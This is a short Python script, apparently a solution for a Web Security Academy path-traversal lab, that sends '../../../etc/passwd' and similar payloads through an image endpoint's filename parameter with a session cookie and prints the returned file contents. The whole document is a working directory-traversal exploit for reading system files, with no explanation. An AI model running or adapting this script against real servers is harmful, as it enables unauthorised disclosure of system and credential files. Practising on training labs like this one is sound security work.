import requests

url = 'https://0a8400f703f930368030762f005c00f6.web-security-academy.net'
wordlist = [
    'etc/passwd', 'etc/hostname'
]

cookies = {
    "session":"4tgXk4AXrbrUxKScInuGMOBLkh8i3p2n"
}

def discover_resources(words):
   for word in words:
        payload = f"../../../{word}"
        params = {'filename':payload}
        
        try:
            request = requests.get(url+'/image', params=params, cookies=cookies)
            if request.status_code == 200:
                print(word)
                print("-")
                print(request.text)
                print("---")
        except:
            pass

discover_resources(wordlist)